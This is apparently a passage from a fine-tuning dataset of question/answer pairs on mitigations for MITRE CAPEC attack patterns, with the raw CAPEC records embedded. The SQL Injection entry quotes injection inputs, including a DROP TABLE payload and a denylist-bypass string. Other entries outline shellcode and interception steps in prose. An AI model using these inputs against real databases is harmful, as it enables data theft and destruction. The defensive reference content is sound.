[
  {
    "instruction": "Given the attack pattern: ICMP Fragmentation (CAPEC ID: 496). what are the possible mitigations",
    "context": "",
    "output": "Possible mitigations: This attack may be mitigated through egress filtering based on ICMP payload so a network is a \"good neighbor\" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": "This attack may be mitigated through egress filtering based on ICMP payload so a network is a \"good neighbor\" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.",
      "@Name": "ICMP Fragmentation (CAPEC ID: 496)",
      "attack_ptrn": {
        "@ID": "496",
        "@Name": "ICMP Fragmentation",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "130"
          }
        },
        "Prerequisites": {
          "Prerequisite": "This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target."
        },
        "Mitigations": {
          "Mitigation": "This attack may be mitigated through egress filtering based on ICMP payload so a network is a \"good neighbor\" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "770"
            },
            {
              "@CWE_ID": "404"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-425"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2019-04-04",
            "Modification_Comment": "Updated Related_Weaknesses"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I mitigate the following CAPEC attack pattern: SOAP Array Overflow (CAPEC ID: 256)",
    "context": "",
    "output": "Here are the mitigations relevant for SOAP Array Overflow (CAPEC ID: 256):\nIf the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.",
      "@Name": "SOAP Array Overflow (CAPEC ID: 256)",
      "attack_ptrn": {
        "@ID": "256",
        "@Name": "SOAP Array Overflow",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application to perform the buffer overflow on. In this attack, adversaries look for applications that utilize SOAP as a communication mechanism."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.",
              "Technique": "The adversary creates a SOAP message that incorrectly specifies the size of its array to be smaller than the size of the actual content by a large margin and sends it to the application. If this causes a crash or some unintended behavior, it is likely that this is a valid injection vector."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs",
                "The adversary will choose a SOAP type that allows them to put shellcode into the buffer when the array is read into the application."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the injection vector, the adversary sends the crafted SOAP message to the program, overflowing the buffer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array."
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message."
        },
        "Mitigations": {
          "Mitigation": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "805"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "35",
            "Entry_Name": "SOAP Array Abuse"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-102"
            },
            {
              "@External_Reference_ID": "REF-103",
              "@Section": "5.4.2 Arrays"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Return the mitigations to the following attack pattern: Add Malicious File to Shared Webroot (CAPEC ID: 563)",
    "context": "",
    "output": "For attack pattern Add Malicious File to Shared Webroot (CAPEC ID: 563), the list of mitigations is: Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": "Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.",
      "@Name": "Add Malicious File to Shared Webroot (CAPEC ID: 563)",
      "attack_ptrn": {
        "@ID": "563",
        "@Name": "Add Malicious File to Shared Webroot",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "17"
          }
        },
        "Mitigations": {
          "Mitigation": "Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "284"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Retrieve list of mitigations for the  attack pattern - Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
    "context": "",
    "output": "Sure. Here is the requested list of mitigations: Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.\nOnly use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.\nConfigure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": [
        "Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.",
        "Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.",
        "Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security."
      ],
      "@Name": "Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
      "attack_ptrn": {
        "@ID": "217",
        "@Name": "Exploiting Incorrectly Configured SSL/TLS",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.",
        "Extended_Description": "SSL/TLS communications become vulnerable to this attack when they use outdated versions and insecure ciphers. Currently, all SSL versions are deprecated and TLS versions 1.0 and 1.1 are also deprecated due to being insecure. It is still possible for later versions of TLS to be insecure if they are configured with insecure ciphers such as 3DES or RC4.",
        "Likelihood_Of_Attack": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "216"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.",
              "Technique": "If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).",
              "Technique": [
                "Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.",
                "If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.",
                "Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.",
              "Technique": [
                "Use known exploits for old SSL and TLS versions.",
                "Use known exploits for weak ciphers such as DES and RC4."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Access to the client/server stream."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.",
            "Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.",
            "Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security."
          ]
        },
        "Example_Instances": {
          "Example": "Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "201"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Execution_Flow, Extended_Description, Mitigations, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "Exploiting Incorrectly Configured SSL Security Levels"
            },
            {
              "@Date": "2022-02-22",
              "#text": "Exploiting Incorrectly Configured SSL"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: SQL Injection (CAPEC ID: 66). what are the possible mitigations",
    "context": "",
    "output": "Possible mitigations: Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.\nUse of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.\nUse of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": [
        "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.",
        "Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.",
        "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application."
      ],
      "@Name": "SQL Injection (CAPEC ID: 66)",
      "attack_ptrn": {
        "@ID": "66",
        "@Name": "SQL Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input.",
        "Extended_Description": {
          "xhtml:p": "When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to interact directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey application] The attacker first takes an inventory of the functionality exposed by the application.",
              "Technique": [
                "Spider web sites for all available links",
                "Sniff network communications with application using a utility such as WireShark."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.",
              "Technique": [
                "Use web browser to inject input through text fields or through HTTP GET parameters.",
                "Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.",
                "Use network-level packet injection tools such as netcat to inject input",
                "Use modified client (modified by reverse engineering) to inject input."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.",
              "Technique": [
                "Use public resources such as \"SQL Injection Cheat Sheet\" at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.",
                "Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : \"' OR 1=1; --\", or something else that would syntactically complete a hypothesized query. Iteratively refine the query.",
                "Use \"Blind SQL Injection\" techniques to extract information about the database schema.",
                "If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: \"'; DROP TABLE SYSOBJECTS; --\" and \"'); DROP TABLE SYSOBJECTS; --\". These particular queries will likely not work because the SYSOBJECTS table is generally protected."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.",
              "Technique": "Craft and Execute underlying SQL query"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "SQL queries used by the application to store, retrieve or modify data.",
            "User-controllable input that is not properly validated by the application as part of SQL queries."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": "Too many false or invalid queries to the database, especially those caused by malformed input."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.",
            "Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.",
            "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application."
          ]
        },
        "Example_Instances": {
          "Example": "With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as \"foo'/**/UNION\" or \"foo UNION/**/\" to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "1286"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "19",
              "Entry_Name": "SQL Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "SQL Injection"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-607",
            "@Section": "Testing for SQL Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Influence Perception of Consensus or Social Proof (CAPEC ID: 424). what are the possible mitigations",
    "context": "",
    "output": "Possible mitigations: An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.",
      "@Name": "Influence Perception of Consensus or Social Proof (CAPEC ID: 424)",
      "attack_ptrn": {
        "@ID": "424",
        "@Name": "Influence Perception of Consensus or Social Proof",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The adversary influences the target's actions by leveraging the inherent human nature to assume behavior of others is appropriate. In situations of uncertainty, people tend to behave in ways they see others behaving. The adversary convinces the target of adopting behavior or actions that is advantageous to the adversary.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "417"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Other",
            "Note": "Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-348"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-08-04",
            "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
          },
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Target Influence via Perception of Consensus or Social Proof"
          }
        }
      }
    }
  },
  {
    "instruction": "Retrieve list of mitigations for the  attack pattern - URL Encoding (CAPEC ID: 72)",
    "context": "",
    "output": "Sure. Here is the requested list of mitigations: Refer to the RFCs to safely decode URL.\n- Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.\n- There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).\n- Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.\n- Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.\n- Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)\n- When client input is required from web-based forms, avoid using the \"GET\" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the \"POST method whenever possible.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": [
        "Refer to the RFCs to safely decode URL.",
        "Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.",
        "There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).",
        "Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.",
        "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.",
        "Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)",
        "When client input is required from web-based forms, avoid using the \"GET\" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the \"POST method whenever possible."
      ],
      "@Name": "URL Encoding (CAPEC ID: 72)",
      "attack_ptrn": {
        "@ID": "72",
        "@Name": "URL Encoding",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.",
        "Extended_Description": {
          "xhtml:p": [
            "A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE).",
            "For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An adversary will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL.",
            "It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The adversary could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an adversary may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section)."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "267"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.",
              "Technique": "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the \"Explore\" phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.",
              "Technique": [
                "Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.",
                "Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
